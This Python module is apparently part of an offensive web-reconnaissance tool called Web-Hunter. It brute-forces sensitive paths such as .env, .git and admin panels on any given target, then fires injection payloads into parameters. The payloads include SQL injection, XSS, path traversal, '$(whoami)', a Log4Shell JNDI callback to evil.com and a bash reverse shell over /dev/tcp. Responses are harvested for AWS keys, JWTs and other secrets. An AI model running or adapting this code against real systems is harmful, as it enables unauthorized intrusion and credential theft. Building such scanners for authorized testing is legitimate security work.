
#!/usr/bin/env python3
"""
Smart Fuzzing Engine for Web-Hunter
Uses machine learning to prioritize fuzzing parameters and paths
"""

import os
import json
import random
import requests
import concurrent.futures
import nltk
import re
import urllib.parse
from colorama import Fore
from .utils import print_colored, STATUS_SYMBOLS, show_progress, save_to_file

# Try to download NLTK data if not already present
try:
    nltk.data.find('tokenizers/punkt')
except LookupError:
    nltk.download('punkt', quiet=True)

class SmartFuzzer:
    """Smart fuzzing engine that learns from results"""
    
    def __init__(self, output_dir):
        self.output_dir = output_dir
        self.fuzzing_dir = os.path.join(output_dir, "fuzzing")
        if not os.path.exists(self.fuzzing_dir):
            os.makedirs(self.fuzzing_dir)
        
        # Load common wordlists
        self.params = self._load_wordlist("params", [
            "id", "user", "username", "pass", "password", "key", "api", "token", "secret",
            "file", "page", "query", "search", "sort", "filter", "limit", "offset", "redirect",
            "return", "target", "url", "view", "cmd", "exec", "command", "do", "action",
            "data", "input", "name", "email", "type", "debug", "proxy", "admin", "content",
            "auth", "session", "account", "role", "permission", "group", "profile", "config",
            "setting", "option", "mode", "format", "callback", "jsonp", "method", "service",
            "func", "function", "callback", "process", "task", "object", "uid", "uuid", "guid",
            "hash", "signature", "hmac", "csrf", "xsrf", "nonce", "state", "code", "grant",
            "access", "refresh", "authcode", "backup", "temp", "file", "path", "directory"
        ])
        
        self.paths = self._load_wordlist("paths", [
            "admin", "login", "register", "signup", "api", "user", "users", "account",
            "profile", "dashboard", "settings", "config", "configure", "setup", "install",
            "backup", "upload", "download", "file", "files", "admin.php", "wp-admin",
            "administrator", "manager", "manage", "management", "auth", "authenticate",
            "cp", "controlpanel", "console", "admin-console", "administrator-console",
            "system", "sys", "cmd", "debug", "test", "dev", "development", "staging",
            "api/v1", "api/v2", "api/v3", "graphql", "gql", "graphiql", "swagger", "docs",
            "documentation", "sdk", "internal", "private", "public", "oauth", "oauth2",
            "token", "auth/token", "api/token", "jwt", "rest", "soap", "xml", "json",
            "metrics", "health", "status", "ping", "echo", "env", "environment",
            "conf", "configuration", "log", "logs", "trace", "monitor", "stats",
            "phpinfo.php", "info.php", "test.php", "phpinfo", "php-info", "server-status",
            "server-info", "actuator", "prometheus", ".git", ".svn", ".env", ".htaccess",
            "backup", "bak", "old", "temp", "tmp", "new", "beta", "alpha", "prod", "production",
            "db", "database", "sql", "mysql", "pgsql", "mongodb", "redis", "elastic", "solr",
            "jenkins", "travis", "circleci", "github", "gitlab", "bitbucket", "jira", "confluence"
        ])
        
        # Success patterns that indicate a valuable finding
        self.success_patterns = [
            "admin", "password", "token", "key", "secret", "config", "error",
            "exception", "sql", "database", "warning", "invalid", "incorrect",
            "credential", "auth", "root", "uid=", "gid=", "admin", "administrator",
            "superuser", "system", "internal", "private", "access", "forbidden", "denied",
            "vulnerable", "injection", "xss", "csrf", "attack", "hack", "exploit",
            "api key", "apikey", "client_secret", "client_id", "debug", "test mode",
            "localhost", "127.0.0.1", "0.0.0.0", "unhandled", "directory listing"
        ]
        
        # Initialize learning data
        self.successful_paths = set()
        self.successful_params = set()
        self.unsuccessful_paths = set()
        self.unsuccessful_params = set()
        
        # Source code analysis regex patterns
        self.endpoint_patterns = [
            r'(GET|POST|PUT|DELETE|PATCH|OPTIONS)\s+[\"\']([/\w\-\._~:/?#\[\]@!$&\'\(\)\*\+,;=]+)[\"\']',
            r'(url|href|action|src)\s*=\s*[\"\']([/\w\-\._~:/?#\[\]@!$&\'\(\)\*\+,;=]+)[\"\']',
            r'[\'\"](/[/\w\-\._~:/?#\[\]@!$&\'\(\)\*\+,;=]+)[\'\"]\s*[,})]',
            r'path\s*:\s*[\'\"]([/\w\-\._~:/?#\[\]@!$&\'\(\)\*\+,;=]+)[\'\"]',
            r'api\.([a-zA-Z]+)\([\'\"]([/\w\-\._~:/?#\[\]@!$&\'\(\)\*\+,;=]+)[\'\"]',
            r'@RequestMapping\([\'\"]([/\w\-\._~:/?#\[\]@!$&\'\(\)\*\+,;=]+)[\'\"]',
            r'@GetMapping\([\'\"]([/\w\-\._~:/?#\[\]@!$&\'\(\)\*\+,;=]+)[\'\"]',
            r'@PostMapping\([\'\"]([/\w\-\._~:/?#\[\]@!$&\'\(\)\*\+,;=]+)[\'\"]',
            r'route\([\'\"]([/\w\-\._~:/?#\[\]@!$&\'\(\)\*\+,;=]+)[\'\"]'
        ]
    
    def _load_wordlist(self, name, default_list):
        """Load a wordlist from file or use default"""
        try:
            wordlist_file = os.path.join(self.fuzzing_dir, f"{name}_wordlist.txt")
            
            # If wordlist file doesn't exist, create it with defaults
            if not os.path.exists(wordlist_file):
                with open(wordlist_file, 'w') as f:
                    f.write('\n'.join(default_list))
                return default_list
            
            # Load existing wordlist
            with open(wordlist_file, 'r') as f:
                return [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
                
        except Exception as e:
            print_colored(f"[{STATUS_SYMBOLS['error']}] Error loading {name} wordlist: {str(e)}", Fore.RED)
            return default_list
    
    def _save_learning_data(self):
        """Save learning data to files"""
        # Save successful paths
        success_paths_file = os.path.join(self.fuzzing_dir, "successful_paths.txt")
        save_to_file(list(self.successful_paths), success_paths_file)
        
        # Save successful params
        success_params_file = os.path.join(self.fuzzing_dir, "successful_params.txt")
        save_to_file(list(self.successful_params), success_params_file)
        
        # Update wordlists with new learned entries
        self._update_wordlist("paths", self.successful_paths)
        self._update_wordlist("params", self.successful_params)
    
    def _update_wordlist(self, name, successful_items):
        """Update a wordlist with newly discovered successful items"""
        wordlist_file = os.path.join(self.fuzzing_dir, f"{name}_wordlist.txt")
        
        try:
            # Load current wordlist
            current_wordlist = set(self._load_wordlist(name, []))
            
            # Add new items
            current_wordlist.update(successful_items)
            
            # Save updated wordlist
            save_to_file(list(current_wordlist), wordlist_file)
            
        except Exception as e:
            print_colored(f"[{STATUS_SYMBOLS['error']}] Error updating {name} wordlist: {str(e)}", Fore.RED)
    
    def _is_interesting_response(self, response):
        """Check if a response contains interesting data"""
        if not response or not response.text:
            return False
        
        # Check status code ranges that are interesting
        interesting_status = (response.status_code != 404 and 
                              response.status_code != 403 and
                              response.status_code != 400)
        
        if not interesting_status:
            return False
        
        # Look for success patterns in response
        text_lower = response.text.lower()
        for pattern in self.success_patterns:
            if pattern in text_lower:
                return True
        
        # Check response size
        if len(response.text) > 500:  # Larger responses might contain useful info
            return True
        
        # Check for interesting headers
        interesting_headers = ["x-api", "authorization", "www-authenticate", "server", "x-powered-by"]
        for header in interesting_headers:
            if any(header in key.lower() for key in response.headers.keys()):
                return True
        
        return False
    
    def _analyze_response(self, response, target_url):
        """Analyze a response and extract useful information"""
        if not response or not self._is_interesting_response(response):
            return None
        
        try:
            # Extract data based on content type
            content_type = response.headers.get('Content-Type', '')
            
            if 'application/json' in content_type:
                # JSON response
                try:
                    data = response.json()
                    return {
                        'url': target_url,
                        'status': response.status_code,
                        'content_type': content_type,
                        'data': data
                    }
                except:
                    pass
            
            # Text/HTML response - extract certain patterns
            extracted_data = {}
            
            # Extract potential tokens, secrets, etc.
            text = response.text.lower()
            for key in ["token", "key", "secret", "password", "api", "access"]:
                if key in text:
                    # Try to extract the value using basic pattern matching
                    sentences = nltk.sent_tokenize(response.text)
                    for sentence in sentences:
                        if key in sentence.lower():
                            extracted_data[key] = sentence
            
            # Look for common sensitive patterns
            patterns = {
                'emails': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
                'api_keys': r'[a-zA-Z0-9]{32,45}',
                'aws_keys': r'AKIA[0-9A-Z]{16}',
                'jwt_tokens': r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
                'internal_paths': r'/(home|var|etc|usr|opt|root)/[a-zA-Z0-9/._-]+'
            }
            
            for pattern_name, pattern in patterns.items():
                matches = re.findall(pattern, response.text)
                if matches:
                    extracted_data[pattern_name] = matches[:5]  # Limit to first 5 matches
            
            if extracted_data:
                return {
                    'url': target_url,
                    'status': response.status_code,
                    'content_type': content_type,
                    'extracted': extracted_data
                }
            
            # If nothing specific found but response is interesting
            if self._is_interesting_response(response):
                return {
                    'url': target_url,
                    'status': response.status_code,
                    'content_type': content_type,
                    'size': len(response.text),
                    'headers': dict(response.headers)
                }
            
        except Exception as e:
            print_colored(f"[{STATUS_SYMBOLS['error']}] Error analyzing response: {str(e)}", Fore.RED)
        
        return None
    
    def extract_endpoints_from_source(self, source_code, base_url=None):
        """Extract potential endpoints from source code"""
        if not source_code:
            return []
            
        print_colored(f"[{STATUS_SYMBOLS['info']}] Analyzing source code for endpoints", Fore.CYAN)
        
        endpoints = set()
        
        for pattern in self.endpoint_patterns:
            matches = re.findall(pattern, source_code)
            for match in matches:
                # Handle different match formats from regex groups
                endpoint = match[1] if isinstance(match, tuple) and len(match) > 1 else match
                
                # Clean and normalize the endpoint
                if endpoint and len(endpoint) > 1:
                    # Remove quotes and extra characters
                    endpoint = endpoint.strip("'\"(), ")
                    
                    # Skip data URIs, anchor links, and template variables
                    if (endpoint.startswith('data:') or endpoint == '#' or 
                        '{{' in endpoint or '${' in endpoint):
                        continue
                        
                    # Normalize
                    if endpoint.startswith('./'):
                        endpoint = endpoint[2:]
                    
                    # Add to endpoints set
                    endpoints.add(endpoint)
        
        # Convert relative paths to absolute URLs if base_url is provided
        if base_url:
            absolute_endpoints = set()
            parsed_base = urllib.parse.urlparse(base_url)
            base_domain = f"{parsed_base.scheme}://{parsed_base.netloc}"
            
            for endpoint in endpoints:
                if endpoint.startswith('/'):
                    absolute_endpoints.add(f"{base_domain}{endpoint}")
                elif not (endpoint.startswith('http://') or endpoint.startswith('https://')):
                    absolute_endpoints.add(f"{base_domain}/{endpoint}")
                else:
                    absolute_endpoints.add(endpoint)
            
            endpoints = absolute_endpoints
        
        print_colored(f"[{STATUS_SYMBOLS['success']}] Found {len(endpoints)} potential endpoints in source code", Fore.GREEN)
        return list(endpoints)
    
    def fuzz_target(self, target, max_requests=300):
        """Fuzz a target with smart path and parameter discovery"""
        print_colored(f"\n[{STATUS_SYMBOLS['info']}] Starting smart fuzzing on {target}", Fore.CYAN)
        
        # Ensure the target has a scheme
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        
        # Create a directory for this target
        target_name = target.replace('https://', '').replace('http://', '').replace('/', '_')
        target_dir = os.path.join(self.fuzzing_dir, target_name)
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)
        
        findings = []
        
        # Determine how many requests to allocate to each phase
        path_requests = int(max_requests * 0.5)  # 50% for path discovery
        param_requests = int(max_requests * 0.3)  # 30% for param fuzzing
        source_code_requests = max_requests - path_requests - param_requests  # 20% for source code analysis
        
        # Step 1: Source code analysis for endpoints
        print_colored(f"[{STATUS_SYMBOLS['info']}] Source code analysis ({source_code_requests} requests)", Fore.CYAN)
        source_code_findings = self._extract_from_source_code(target, source_code_requests)
        findings.extend(source_code_findings)
        
        # Step 2: Path fuzzing
        print_colored(f"[{STATUS_SYMBOLS['info']}] Path fuzzing ({path_requests} requests)", Fore.CYAN)
        path_findings = self._fuzz_paths(target, path_requests)
        findings.extend(path_findings)
        
        # Step 3: Parameter fuzzing
        print_colored(f"[{STATUS_SYMBOLS['info']}] Parameter fuzzing ({param_requests} requests)", Fore.CYAN)
        param_findings = self._fuzz_parameters(target, param_requests)
        findings.extend(param_findings)
        
        # Save findings
        if findings:
            findings_file = os.path.join(target_dir, "fuzzing_findings.json")
            with open(findings_file, 'w') as f:
                json.dump(findings, f, indent=4)
            
            print_colored(f"[{STATUS_SYMBOLS['success']}] Found {len(findings)} interesting endpoints", Fore.GREEN)
            print_colored(f"[{STATUS_SYMBOLS['info']}] Results saved to {findings_file}", Fore.CYAN)
        else:
            print_colored(f"[{STATUS_SYMBOLS['warning']}] No interesting findings from fuzzing", Fore.YELLOW)
        
        # Save learning data
        self._save_learning_data()
        
        return findings
    
    def _extract_from_source_code(self, target, max_requests):
        """Extract and analyze endpoints from source code"""
        findings = []
        headers = {'User-Agent': 'Mozilla/5.0'}
        
        try:
            # First, fetch the main page source code
            response = requests.get(target, headers=headers, timeout=10, verify=False)
            source_code = response.text
            
            # Extract JS file references
            js_pattern = r'src=[\'"](.*?\.js)[\'"]'
            js_files = re.findall(js_pattern, source_code)
            
            # Normalize JS file paths
            parsed_target = urllib.parse.urlparse(target)
            base_domain = f"{parsed_target.scheme}://{parsed_target.netloc}"
            
            normalized_js_files = []
            for js_file in js_files:
                if js_file.startswith('http'):
                    normalized_js_files.append(js_file)
                elif js_file.startswith('/'):
                    normalized_js_files.append(f"{base_domain}{js_file}")
                else:
                    normalized_js_files.append(f"{base_domain}/{js_file}")
            
            # Limit JS files to analyze based on max_requests
            js_files_to_analyze = normalized_js_files[:max_requests]
            
            print_colored(f"[{STATUS_SYMBOLS['info']}] Analyzing {len(js_files_to_analyze)} JavaScript files", Fore.CYAN)
            
            # Extract endpoints from main page
            main_endpoints = self.extract_endpoints_from_source(source_code, target)
            
            # Try to fetch and analyze each JS file
            all_js_source = ""
            progress = show_progress(len(js_files_to_analyze), "JS Analysis")
            
            for js_url in js_files_to_analyze:
                try:
                    js_response = requests.get(js_url, headers=headers, timeout=10, verify=False)
                    if js_response.status_code == 200:
                        all_js_source += js_response.text
                except Exception:
                    pass  # Silently continue on error
                progress.update(1)
            
            progress.close()
            
            # Extract endpoints from JS files
            js_endpoints = self.extract_endpoints_from_source(all_js_source, target)
            
            # Combine all discovered endpoints
            all_endpoints = list(set(main_endpoints + js_endpoints))
            
            # Test the discovered endpoints
            print_colored(f"[{STATUS_SYMBOLS['info']}] Testing {len(all_endpoints)} discovered endpoints", Fore.CYAN)
            progress = show_progress(len(all_endpoints), "Endpoint Testing")
            
            def test_endpoint(url):
                try:
                    response = requests.get(url, headers=headers, timeout=10, verify=False)
                    result = self._analyze_response(response, url)
                    if result:
                        return result
                except:
                    pass
                finally:
                    progress.update(1)
                return None
            
            # Test endpoints in parallel
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                results = list(filter(None, executor.map(test_endpoint, all_endpoints)))
            
            progress.close()
            findings.extend(results)
            
            # Save discovered endpoints
            endpoints_file = os.path.join(self.fuzzing_dir, f"{parsed_target.netloc}_endpoints.txt")
            save_to_file(all_endpoints, endpoints_file)
            
            print_colored(f"[{STATUS_SYMBOLS['success']}] Source code analysis discovered {len(all_endpoints)} endpoints", Fore.GREEN)
            print_colored(f"[{STATUS_SYMBOLS['success']}] Found {len(results)} interesting endpoints", Fore.GREEN)
            
        except Exception as e:
            print_colored(f"[{STATUS_SYMBOLS['error']}] Error in source code analysis: {str(e)}", Fore.RED)
        
        return findings
    
    def _fuzz_paths(self, target, max_requests):
        """Fuzz paths on the target"""
        findings = []
        
        # Prioritize paths: Start with known successful paths, then try others
        prioritized_paths = list(self.successful_paths) + [p for p in self.paths if p not in self.successful_paths]
        
        # Limit to max_requests
        paths_to_try = prioritized_paths[:max_requests]
        
        print_colored(f"[{STATUS_SYMBOLS['info']}] Fuzzing {len(paths_to_try)} paths on {target}", Fore.CYAN)
        progress = show_progress(len(paths_to_try), "Path fuzzing")
        
        def fuzz_path(path):
            url = f"{target}/{path}"
            try:
                response = requests.get(url, timeout=5, allow_redirects=True, 
                                      verify=False, headers={'User-Agent': 'Web-Hunter Smart Fuzzer'})
                
                result = self._analyze_response(response, url)
                if result:
                    self.successful_paths.add(path)
                    print_colored(f"[+] Found interesting path: {path} (Status: {response.status_code})", Fore.GREEN)
                    return result
                else:
                    self.unsuccessful_paths.add(path)
                    return None
                    
            except Exception as e:
                return None
            finally:
                progress.update(1)
        
        # Run fuzzing in parallel
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            results = list(filter(None, executor.map(fuzz_path, paths_to_try)))
        
        progress.close()
        findings.extend(results)
        
        print_colored(f"[{STATUS_SYMBOLS['info']}] Path fuzzing complete. Found {len(results)} interesting paths", Fore.CYAN)
        return findings
    
    def _fuzz_parameters(self, target, max_requests):
        """Fuzz parameters on the target and its discovered paths"""
        findings = []
        
        # Get base URLs to test (target plus any successful paths)
        base_urls = [target]
        for path in self.successful_paths:
            base_urls.append(f"{target}/{path}")
        
        # Limit base URLs to keep request count manageable
        if len(base_urls) > 5:
            base_urls = base_urls[:5]
        
        # Calculate requests per URL
        requests_per_url = max_requests // len(base_urls)
        
        # Prioritize parameters
        prioritized_params = list(self.successful_params) + [p for p in self.params if p not in self.successful_params]
        
        for base_url in base_urls:
            print_colored(f"[{STATUS_SYMBOLS['info']}] Parameter fuzzing on {base_url}", Fore.CYAN)
            
            # Parameters to try for this URL
            params_to_try = prioritized_params[:requests_per_url]
            
            progress = show_progress(len(params_to_try), "Parameter fuzzing")
            
            def fuzz_param(param):
                # Generate a value that might trigger interesting behavior
                values = ["1", "true", "admin", "password", "'", "1=1", "<script>alert(1)</script>", 
                          "../../etc/passwd", "${jndi:ldap://evil.com}", "$(whoami)", 
                          "%0A/bin/bash -i >& /dev/tcp/127.0.0.1/4444 0>&1", 
                          "\"};alert(1);{\"", "*", "-1"]
                url = f"{base_url}?{param}={random.choice(values)}"
                
                try:
                    response = requests.get(url, timeout=5, allow_redirects=True,
                                          verify=False, headers={'User-Agent': 'Web-Hunter Smart Fuzzer'})
                    
                    result = self._analyze_response(response, url)
                    if result:
                        self.successful_params.add(param)
                        print_colored(f"[+] Found interesting parameter: {param} (Status: {response.status_code})", Fore.GREEN)
                        return result
                    else:
                        self.unsuccessful_params.add(param)
                        return None
                        
                except Exception as e:
                    return None
                finally:
                    progress.update(1)
            
            # Run fuzzing in parallel
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                results = list(filter(None, executor.map(fuzz_param, params_to_try)))
            
            progress.close()
            findings.extend(results)
        
        print_colored(f"[{STATUS_SYMBOLS['info']}] Parameter fuzzing complete. Found {len(findings)} interesting parameters", Fore.CYAN)
        return findings

def run_smart_fuzzing(targets, output_dir, max_requests_per_target=300):
    """Run smart fuzzing on a list of targets"""
    print_colored(f"\n[{STATUS_SYMBOLS['info']}] Starting Smart Fuzzing Engine on {len(targets)} targets", Fore.CYAN)
    print_colored(f"[{STATUS_SYMBOLS['warning']}] This module will perform active testing and may trigger alerts!", Fore.YELLOW)
    
    fuzzer = SmartFuzzer(output_dir)
    all_findings = []
    
    for target in targets:
        findings = fuzzer.fuzz_target(target, max_requests_per_target)
        all_findings.extend(findings)
    
    # Save combined results
    if all_findings:
        combined_file = os.path.join(output_dir, "fuzzing", "combined_findings.json")
        with open(combined_file, 'w') as f:
            json.dump(all_findings, f, indent=4)
        
        print_colored(f"[{STATUS_SYMBOLS['success']}] Smart fuzzing completed with {len(all_findings)} findings", Fore.GREEN)
        print_colored(f"[{STATUS_SYMBOLS['info']}] Combined results saved to {combined_file}", Fore.CYAN)
        
        # Create summary of findings
        summary_file = os.path.join(output_dir, "fuzzing", "findings_summary.txt")
        with open(summary_file, 'w') as f:
            f.write("SMART FUZZING FINDINGS SUMMARY\n")
            f.write("=" * 50 + "\n\n")
            
            # Group findings by target
            findings_by_target = {}
            for finding in all_findings:
                url = finding.get('url', '')
                parsed = urllib.parse.urlparse(url)
                hostname = parsed.netloc
                
                if hostname not in findings_by_target:
                    findings_by_target[hostname] = []
                
                findings_by_target[hostname].append(finding)
            
            # Write summary for each target
            for hostname, findings in findings_by_target.items():
                f.write(f"Target: {hostname}\n")
                f.write("-" * 30 + "\n")
                f.write(f"Total findings: {len(findings)}\n\n")
                
                # List interesting URLs
                f.write("Interesting URLs:\n")
                for finding in findings[:20]:  # Limit to first 20
                    url = finding.get('url', '')
                    status = finding.get('status', 'unknown')
                    f.write(f"- {url} (Status: {status})\n")
                
                if len(findings) > 20:
                    f.write(f"... and {len(findings) - 20} more\n")
                
                f.write("\n\n")
        
        print_colored(f"[{STATUS_SYMBOLS['info']}] Summary saved to {summary_file}", Fore.CYAN)
    else:
        print_colored(f"[{STATUS_SYMBOLS['warning']}] Smart fuzzing completed with no findings", Fore.YELLOW)
    
    return all_findings
